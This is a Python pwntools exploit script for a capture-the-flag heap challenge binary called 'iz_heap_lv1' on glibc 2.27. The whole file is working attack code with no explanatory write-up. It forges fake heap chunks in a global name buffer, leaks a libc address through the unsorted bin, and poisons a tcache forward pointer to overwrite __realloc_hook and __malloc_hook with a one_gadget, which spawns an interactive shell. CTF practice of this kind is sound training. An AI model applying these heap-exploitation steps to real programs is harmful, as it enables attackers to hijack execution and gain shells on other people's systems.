#!/usr/bin/env python3

from pwn import *

exe = ELF("./iz_heap_lv1_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = 'critical'

def add(size, data):
    p.sendlineafter(b'Choice:', b'1')
    p.sendlineafter(b'Enter size:', '{}'.format(size).encode())
    p.sendafter(b'Enter data:', data)

def edit(index, size, data):
    p.sendlineafter(b'Choice:', b'2')
    p.sendlineafter(b'Enter index:', '{}'.format(index).encode())
    p.sendlineafter(b'Enter size:', '{}'.format(size).encode())
    p.sendafter(b'Enter data:', data)

def delete(index):
    p.sendlineafter(b'Choice:', b'3')
    p.sendlineafter(b'Enter index:', '{}'.format(index).encode())

def set_name(name=b'default'):
    p.sendafter(b'Input name:', name)

def show(edit=b'N', name=b'default'):
    p.sendlineafter(b'Choice:', b'4')
    p.sendlineafter(b'(Y/N)', edit)
    if edit==b'Y':
        set_name(name)
    return p.recvline()

p = process('./iz_heap_lv1_patched')

###########################################
### Stage 1: Leak address and calculate ###
###########################################
one_gadget_offset = 0x10a38c
pointer_to_fake_chunk = flat(0x602100 + 0x20, 0)
fake_chunk = fit({
    0x0: flat(0, 0x91),
    0x90: flat(0, 0x21),    # Avoid heap consolidation
    0xb0: flat(0, 0x21)     # Avoid heap consolidation
    }, filler = b'\x00')
set_name(pointer_to_fake_chunk + fake_chunk)

for i in range(7):
    add(0x80, str(i).encode())
for i in range(7):
    delete(i)
# delete this one will go to unsorted bin,
# because tcache is full 7 chunk of same size.
delete(20)

heap_leak = u64(show(b'Y', b'A'*0x20)[-7:-1] + b'\x00\x00')
print('[+] Heap leak:', hex(heap_leak))
libc_base = heap_leak - 0x3ebca0
print('[*] Libc base:', hex(libc_base))
realloc_hook = libc_base + libc.sym['__realloc_hook']
print('[*] Realloc hook:', hex(realloc_hook))
libc_realloc = libc_base + libc.sym['__libc_realloc']
print('[*] Libc realloc:', hex(libc_realloc))
one_gadget_addr = libc_base + one_gadget_offset
print('[*] one_gadget:', hex(one_gadget_addr))

####################################################
### Stage 2: Overwrite some hook and spawn shell ###
####################################################
pointer_to_fake_chunk = flat(0x602100 + 0x20, 0)
fake_chunk = fit({
    0x0: flat(0, 0x71),
    0x70: flat(0, 0x21),        # Avoid heap consolidation
    0x90: flat(0, 0x21)         # Avoid heap consolidation
    }, filler = b'\x00')
show(b'Y', pointer_to_fake_chunk + fake_chunk)      # Create fake junk
delete(20)      # Chunk goes to tcache

# Overwrite forward pointer
show(b'Y', flat(0, 0, 0, 0x71, realloc_hook))

# Keep the same forward pointer point to realloc_hook
add(0x60, flat(realloc_hook))

# Overwrite __realloc_hook with one_gadget 
# and __malloc_hook with __libc_realloc+6
add(0x60, flat(one_gadget_addr, libc_realloc+6))

p.sendlineafter(b'Choice:', b'1')
p.sendlineafter(b'Enter size:', '{}'.format(0).encode())

p.interactive()